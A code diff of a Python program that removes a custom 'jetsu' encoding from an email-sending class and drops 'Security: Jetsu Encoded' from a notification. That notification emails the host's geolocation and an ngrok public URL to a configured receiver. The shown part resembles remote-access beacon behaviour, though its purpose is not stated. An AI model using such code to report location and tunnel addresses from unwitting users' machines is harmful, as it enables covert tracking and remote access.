@@ -308,12 +308,10 @@ class SecureJetsuMailer:
         return ''.join(result)
     
     def send(self, subject, message):
-        """Send encoded email using configured credentials"""
+        """Send readable email using configured credentials"""
         try:
-            # Encode message
-            encoded_msg = self._to_jetsu(message)
-            
-            msg = MIMEText(encoded_msg)
+            # Send message as plain text (not encoded)
+            msg = MIMEText(message)
             msg['Subject'] = subject
             msg['From'] = self.sender_email
             msg['To'] = self.receiver_email
@@ -324,7 +322,7 @@ class SecureJetsuMailer:
             server.send_message(msg)
             server.quit()
             
-            print(f"✅ Secure jetsu email sent to {self.receiver_email}")
+            print(f"✅ Email sent to {self.receiver_email}")
             return True
         except Exception as e:
             print(f"❌ Send failed: {e}")
@@ -2974,7 +2972,6 @@ def main():
                 
                 📍 Location: {geo_tracker.get_geolocation() or 'Unknown'}
                 ⏰ Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-                🔒 Security: Jetsu Encoded
                 """
             )
             print(f"✅ Ngrok started: {ngrok_manager.public_url}")
